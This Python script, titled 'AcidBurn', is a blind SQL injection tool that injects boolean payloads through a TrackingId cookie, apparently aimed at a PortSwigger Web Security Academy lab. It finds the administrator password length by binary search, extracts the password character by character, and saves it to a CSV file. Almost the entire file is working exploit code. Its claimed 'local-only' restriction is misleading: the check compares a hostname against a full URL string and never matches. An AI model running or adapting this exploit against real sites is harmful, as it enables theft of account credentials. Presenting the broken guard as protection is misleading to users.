# AcidBurn

import argparse
import concurrent.futures
import csv
import sys
import time
import urllib.parse
from typing import Optional

import requests

# --- Configurable defaults ---
DEFAULT_TIMEOUT = 10
DEFAULT_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_PASSWORD_LEN = 128
MIN_PASSWORD_LEN = 1
CSV_OUTPUT = "sqli_results.csv"
WORKERS = 8  # number of concurrent requests when probing a single position

# Helper Funnctions
def is_local_hostname(url: str) -> bool:
    try:
        p = urllib.parse.urlparse(url)
        host = p.hostname
        return host in ('https://0ae2003704812ae181bc5c31001c00d2.web-security-academy.net/')
    except Exception:
        return False

def make_payload(base_tracking: str, injection: str) -> str:
    """
    The TrackingId value should be base_tracking + <injection>.
    Example: base_tracking = "xyz", injection = "' AND '1'='1"
    """
    return base_tracking + injection

def send_probe(session: requests.Session, url: str, tracking_val: str,
               session_cookie: Optional[str], timeout: int) -> Optional[requests.Response]:
    """
    Send a GET request with the given TrackingId cookie and return the response.
    """
    cookies = {}
    cookies["TrackingId"] = tracking_val
    if session_cookie:
        # session cookie assumed to be the raw value (not "session=...")
        cookies["session"] = session_cookie

    try:
        r = session.get(url, cookies=cookies, timeout=timeout, allow_redirects=True)
        return r
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

def response_is_true(resp: Optional[requests.Response], true_marker: str = "Welcome back") -> bool:
    if resp is None:
        return False
    # Simple string presence check - can be adapted to other indicators
    return true_marker in resp.text

# Enumeration Algorithm
def verify_injection_point(session: requests.Session, url: str, base_tracking: str,
                           session_cookie: Optional[str], timeout: int, true_marker: str) -> bool:
    # True payload: ends up valid
    t_true = make_payload(base_tracking, "' AND '1'='1")
    t_false = make_payload(base_tracking, "' AND '1'='2")
    r_true = send_probe(session, url, t_true, session_cookie, timeout)
    r_false = send_probe(session, url, t_false, session_cookie, timeout)
    tr = response_is_true(r_true, true_marker)
    fr = response_is_true(r_false, true_marker)
    print(f"[+] verify: true_payload -> {tr}, false_payload -> {fr}")
    return tr and not fr

def find_length(session: requests.Session, url: str, base_tracking: str,
                session_cookie: Optional[str], timeout: int, true_marker: str,
                min_len=MIN_PASSWORD_LEN, max_len=MAX_PASSWORD_LEN) -> Optional[int]:
    """
    Find length using exponential search to find an upper bound, then binary search.
    This reduces total number of probes vs linear scan.
    """
    print("[*] Determining password length (exponential + binary search)...")
    # Exponential phase to find an upper bound
    lo = min_len
    hi = lo
    while hi <= max_len:
        inj = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{hi})='a"
        payload = make_payload(base_tracking, inj)
        r = send_probe(session, url, payload, session_cookie, timeout)
        if not response_is_true(r, true_marker):
            # hi is not less than actual length -> actual length <= hi
            break
        # still true: length > hi
        lo = hi + 1
        hi = hi * 2 if hi > 0 else 2
        if hi > max_len:
            hi = max_len
            break
        # small delay to avoid overwhelming
        #time.sleep(0.05) 

    # Now, length is in [lo, hi]
    print(f"[*] Exponential phase result: range [{lo}, {hi}]")
    # Binary search
    left = lo
    right = hi
    found = None
    while left <= right:
        mid = (left + right) // 2
        inj = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{mid})='a"
        payload = make_payload(base_tracking, inj)
        r = send_probe(session, url, payload, session_cookie, timeout)
        if response_is_true(r, true_marker):
            # length > mid
            left = mid + 1
        else:
            # length <= mid
            found = mid
            right = mid - 1
        #time.sleep(0.02)
    if found is None:
        print("[!] Could not determine length within bounds.")
        return None
    # Since found is the smallest mid where length <= mid, the length is found (or left)
    # The actual length is left if last check set left = mid+1; better verify:
    # verify exact length by checking equality
    print(f"[*] Candidate length: {found}. Verifying exact length...")
    # find exact length by testing LENGTH(password)=N
    for n in range(max(min_len, found-2), found+3):
        inj = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={n})='a"
        payload = make_payload(base_tracking, inj)
        r = send_probe(session, url, payload, session_cookie, timeout)
        if response_is_true(r, true_marker):
            print(f"[+] Confirmed password length = {n}")
            return n
    print("[!] Failed to confirm exact length after candidate found.")
    return None

def probe_char_at_position(session: requests.Session, url: str, base_tracking: str,
                           session_cookie: Optional[str], timeout: int, true_marker: str,
                           pos: int, charset: str, workers: int) -> Optional[str]:
    """
    Probe one character position (1-indexed). Return the matching character or None.
    Uses concurrency for speed: sends multiple candidate probes in parallel.
    """
    def single_probe(ch: str):
        inj = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{ch}"
        payload = make_payload(base_tracking, inj)
        r = send_probe(session, url, payload, session_cookie, timeout)
        return ch, response_is_true(r, true_marker)

    # Use ThreadPoolExecutor to test multiple chars in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(single_probe, ch): ch for ch in charset}
        for fut in concurrent.futures.as_completed(futures):
            ch, ok = fut.result()
            if ok:
                # cancel other futures if possible (best-effort)
                return ch
    return None

def enumerate_password(session: requests.Session, url: str, base_tracking: str,
                       session_cookie: Optional[str], timeout: int, true_marker: str,
                       length: int, charset: str, workers: int):
    print(f"[*] Enumerating password of length {length} ...")
    password = ["?"] * length
    start_time = time.time()

    # For each position, probe characters
    for pos in range(1, length + 1):
        print(f"[*] Probing position {pos} ...", end=" ", flush=True)
        ch = probe_char_at_position(session, url, base_tracking, session_cookie, timeout, true_marker, pos, charset, workers)
        if ch is None:
            print("[-] no match found for this position.")
            password[pos - 1] = "?"
        else:
            password[pos - 1] = ch
            print(f"[+] found: {ch}")
        # small delay to avoid overloading
        #time.sleep(0.02)
    elapsed = time.time() - start_time
    pwd = "".join(password)
    print(f"[+] Enumeration complete in {elapsed:.1f}s: {pwd}")
    # Save to CSV
    with open(CSV_OUTPUT, "w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["timestamp", "url", "length", "password", "elapsed_seconds"])
        writer.writerow([time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), url, length, pwd, f"{elapsed:.2f}"])
    print(f"[+] Results saved to {CSV_OUTPUT}")
    return pwd

# CLI Display
def main():
    ap = argparse.ArgumentParser(description="Local-only blind SQLi enumerator (boolean-based).")
    ap.add_argument("--url", required=True, help="Target URL (must be localhost or 127.0.0.1).")
    ap.add_argument("--tracking", required=True, help="Base TrackingId value (the known original cookie value).")
    ap.add_argument("--session", required=False, help="Session cookie value (if present).")
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="HTTP request timeout (seconds).")
    ap.add_argument("--charset", default=DEFAULT_CHARSET, help="Characters to try for password positions.")
    ap.add_argument("--workers", type=int, default=WORKERS, help="Concurrency for character probing.")
    ap.add_argument("--max-len", type=int, default=MAX_PASSWORD_LEN, help="Maximum password length to consider.")
    ap.add_argument("--true-marker", default="Welcome back", help="String that indicates a TRUE condition in responses.")
    ap.add_argument("--confirm-local", action="store_true", help="Confirm you will only target a local instance (required).")
    args = ap.parse_args()

    if not args.confirm_local:
        print("[!] This tool is restricted to local testing. Re-run with --confirm-local to confirm.")
        sys.exit(1)

    if not is_local_hostname(args.url):
        print("[!] Refusing to target non-local host. This tool only targets localhost or 127.0.0.1.")
        sys.exit(1)

    session = requests.Session()
    # Set a standard user-agent
    session.headers.update({"User-Agent": "blind-sqli-local-tool/1.0"})

    # Verify injection point
    ok = verify_injection_point(session, args.url, args.tracking, args.session, args.timeout, args.true_marker)
    if not ok:
        print("[!] Injection point verification failed. Aborting.")
        sys.exit(1)

    # Find length
    length = find_length(session, args.url, args.tracking, args.session, args.timeout, args.true_marker,
                         min_len=1, max_len=args.max_len)
    if length is None:
        print("[!] Could not determine password length.")
        sys.exit(1)

    # Enumerate password
    pwd = enumerate_password(session, args.url, args.tracking, args.session, args.timeout, args.true_marker,
                             length, args.charset, args.workers)
    print(f"[+] Final password: {pwd}")

if __name__ == "__main__":
    main()